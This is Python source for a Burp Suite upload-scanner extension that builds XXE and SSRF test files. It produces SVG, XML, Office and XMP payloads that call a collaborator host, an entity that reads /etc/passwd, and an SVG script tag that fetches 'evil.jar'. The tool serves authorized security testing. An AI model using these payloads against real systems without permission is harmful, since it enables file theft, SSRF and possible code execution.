
import cgi
from helpers.FloydsHelpers import FloydsHelpers
from misc.Constants import Constants
from misc.CustomScanIssue import CustomScanIssue
from misc.Misc import Xxe, XxeOfficeDoc, XxeXmp
from misc.Sender import Sender


class xxe_checks():
    def __init__(self, injector, burp_colab, colab_tests, burp_extender, callbacks):
        self.injector = injector
        self.burp_colab = burp_colab
        self.colab_tests = colab_tests
        self.burp_extender = burp_extender
        self.callback_helpers = callbacks.getHelpers()
        self.callbacks = callbacks
        self.sender = Sender(callbacks, burp_extender)
        self.colab_tests.extend(self._xxe_svg_external_image(injector, burp_colab))
        self.colab_tests.extend(self._xxe_svg_external_java_archive(injector, burp_colab))
        self.colab_tests.extend(self._xxe_xml(injector, burp_colab))
        self.colab_tests.extend(self._xxe_office(injector, burp_colab))
        self.colab_tests.extend(self._xxe_xmp(injector, burp_colab))
        self.burp_extender.collab_monitor_thread.add_or_update(self.burp_colab, self.colab_tests)

    def _xxe_svg_external_image(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['svg'].isSelected():
            root_tag = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>'
            text_tag = '<text x="0" y="20" font-size="20">test</text>'
            # The standard file we are going to use for the tests:
            base_svg = root_tag + '<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" ' \
                                    'xmlns:xlink="http://www.w3.org/1999/xlink" ' \
                                    'width="{}" height="{}">{}</svg>'.format(str(injector.opts.image_width),
                                                                        str(injector.opts.image_height),
                                                                        text_tag)

            # First, the SVG specific ones
            # External Image with <image xlink
            content_xlink = base_svg.replace(text_tag, '<image height="30" width="30" xlink:href="{}image.jpeg" />'.format(Constants.MARKER_COLLAB_URL))
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SvgXlink"
            name = "XXE/SSRF via SVG"  # Xlink
            severity = "High"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an SVG image with an Xlink reference " \
                        "which contains a burp collaborator URL. This means that Server Side Request Forgery is possible. " \
                        'The payload was <image xlink:href="{}" /> . ' + \
                        "Usually you will be able to read local files, eg. local pictures. " \
                        "Interactions:<br><br>".format(Constants.MARKER_COLLAB_URL)
            issue = CustomScanIssue(injector.get_brr(), self.callback_helpers, name, detail, confidence, severity)
            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.SVG_TYPES, basename, content_xlink, issue,
                                                    redownload=True))

            # External iFrame according to https://twitter.com/akhilreni_hs/status/1113762867881185281 and
            # https://gist.github.com/akhil-reni/5ed75c28a5406c300597431eafcdae2d
            content_iframe = '<g><foreignObject width="{}" height="{}"><body xmlns="http://www.w3.org/1999/xhtml">' \
                                '<iframe src="{}"></iframe></body></foreignObject></g>'.format(str(injector.opts.image_width),
                                                                                            str(injector.opts.image_height),
                                                                                            Constants.MARKER_COLLAB_URL)
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SvgIframe"
            name = "XXE/SSRF via SVG"  # Iframe
            severity = "High"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an SVG image with an iframe reference " \
                        "which contains a burp collaborator URL. This means that Server Side Request Forgery is possible. " \
                        'The payload was <iframe src="{}"> . ' + \
                        "Usually you will be able to read local files, eg. local pictures. " \
                        "Interactions:<br><br>".format(Constants.MARKER_COLLAB_URL)
            issue = CustomScanIssue(injector.get_brr(), self.callback_helpers, name, detail, confidence, severity)
            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.SVG_TYPES, basename, content_iframe, issue,
                                                        redownload=True))


            # What if the server simply reads the SVG and turn it into a JPEG that has the content?
            # That will be hard to detect (would need something like OCR on JPEG), but at least the user
            # might see that picture... We also regex the download if we detect a passwd...
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SvgPasswdTxt"
            ref = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>'
            passwd_svg = base_svg
            passwd_svg = passwd_svg.replace(root_tag, ref)
            passwd_svg = passwd_svg.replace(text_tag, '<text x="0" y="20" font-size="20">&xxe;</text>')
            urrs = self.sender.simple(injector, Constants.SVG_TYPES, basename, passwd_svg, redownload=True)
            for urr in urrs:
                if urr and urr.download_rr:
                    resp = urr.download_rr.getResponse()
                    if resp:
                        resp = FloydsHelpers.jb2ps(resp)
                        if Constants.REGEX_PASSWD.match(resp):
                            name = "SVG Local File Include"
                            severity = "High"
                            confidence = "Firm"
                            detail = "A passwd-like response was downloaded when uploading an SVG file with a payload that " \
                                        "tries to include /etc/passwd. Therefore arbitrary file read seems possible. "
                            issue = CustomScanIssue(injector.get_brr(), self.callback_helpers, name, detail, confidence, severity)
                            issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
                            self.burp_extender._add_scan_issue(issue)


            # Now let's do the generic ones from the Xxe class
            for payload_desc, technique_name, svg in Xxe.get_payloads(base_svg, root_tag, text_tag, 'text'):
                basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "XxeSvg" + technique_name
                name = "XXE/SSRF via SVG"  # " + technique_name
                severity = "Medium"
                confidence = "Certain"
                detail = "A Burp Colaborator interaction was detected when uploading an SVG image with an " + technique_name + " payload " \
                            "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                            'The payload was ' + cgi.escape(payload_desc) + ' . ' \
                            "Usually you will be able to read local files, eg. local pictures. " \
                            "This issue needs further manual investigation. " \
                            "Interactions:<br><br>"
                issue = CustomScanIssue(injector.get_brr(), self.callback_helpers, name, detail, confidence, severity)
                colab_tests.extend(
                    self.sender.send_collaborator(injector, burp_colab, Constants.SVG_TYPES, basename, svg, issue,
                                            redownload=True))

        return colab_tests

    def _xxe_svg_external_java_archive(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['svg'].isSelected():
            # The standard file we are going to use for the tests:
            base_svg = '<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ' \
                        'version="1.0"><script type="application/java-archive" xlink:href="{}evil.jar' \
                        '"/><text>test</text></svg>'.format(Constants.MARKER_COLLAB_URL)
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SvgScriptJava"
            name = "SVG Script Xlink Java Archive"
            severity = "Medium"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an SVG image with a script tag with a Xlink reference " \
                        "which contains a burp colaborator URL. This means that Server Side Request Forgery is at least possible. " \
                        "However, it is also likely that this results in Remote Command Execution if the JAR file is downloaded and executed. " \
                        "See the following metasploit module as an example for RCE: " \
                        "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/batik_svg_java.rb " \
                        'The payload was <script type="application/java-archive" xlink:href="{}evil.jar"/> . ' \
                        "Usually you will be able to read local files, eg. local pictures. " \
                        "Interactions:<br><br>".format(Constants.MARKER_COLLAB_URL)
            issue = CustomScanIssue(injector.get_brr(), self.callback_helpers, name, detail, confidence, severity)
            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.SVG_TYPES, basename, base_svg, issue, redownload=True))
        return colab_tests

    def _xxe_xml(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['xml'].isSelected():
            # The standard file we are going to use for the tests:
            root_tag = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>' \
                        '<!DOCTYPE test [ \n <!ELEMENT text ANY> \n]>'
            test_tag = '<text>test</text>'
            base_xml = root_tag + test_tag

            for payload_desc, technique_name, xml in Xxe.get_payloads(base_xml, root_tag, test_tag, 'text'):
                basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "XxeXml" + technique_name
                name = "XML " + technique_name + " SSRF/XXE"
                severity = "Medium"
                confidence = "Certain"
                detail = "A Burp Colaborator interaction was detected when uploading an XML file with an " + technique_name + " payload " \
                            "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                            'The payload was ' + cgi.escape(payload_desc) + ' . ' \
                            "Usually you will be able to read local files and do SSRF. This issue needs further manual investigation." \
                            "Interactions:<br><br>"
                issue = CustomScanIssue(injector.get_brr(), self.callback_helpers, name, detail, confidence, severity)
                colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.XML_TYPES, basename, xml, issue, redownload=True))

        return colab_tests

    def _xxe_office(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        x = XxeOfficeDoc(injector.opts.get_enabled_file_formats())
        for payload, name, ext, content in x.get_files():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "XxeOffice" + name
            title = "XXE/SSRF via XML" # " + ext[1:].upper()
            desc = 'XXE through injection of XML {} payloads in the contents of a {} file. The server parsed the code ' \
                    '{} which resulted in a SSRF. '.format(name, ext[1:].upper(), cgi.escape(payload))
            issue = CustomScanIssue(injector.get_brr(), self.callback_helpers, title, desc, "Firm", "High")
            types = [
                ('', ext, ''),
                ('', ext, XxeOfficeDoc.EXTENSION_TO_MIME[ext]),
            ]
            c = self.sender.send_collaborator(injector, burp_colab, types, basename, content, issue,
                                        replace=x._inject_burp_url, redownload=True)
            colab_tests.extend(c)
        return colab_tests

    def _xxe_xmp(self, injector, burp_colab):
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []
        # This is a pretty special case...
        # As we need to fix the XMP metadata length *after* injecting the Burp collaborator URL
        # in the XMP, we can not use functions such as _send_burp_collaborator.
        # Additionally, we would like to (Ab)use the BackdooredFile class to produce the basic
        # Images with XMP tags.
        # Therefore this was entirely implemented in its own class... not a beauty, but it works
        x = XxeXmp(injector.opts.get_enabled_file_formats(), self.burp_extender._globalOptionsPanel.image_exiftool, injector.opts.image_width,
                    injector.opts.image_height, Constants.MARKER_ORIG_EXT, Constants.PROTOCOLS_HTTP, Constants.FILE_START,
                    self.burp_extender._make_http_request)
        return x.do_collaborator_tests(injector, burp_colab, injector.opts.get_enabled_file_formats())
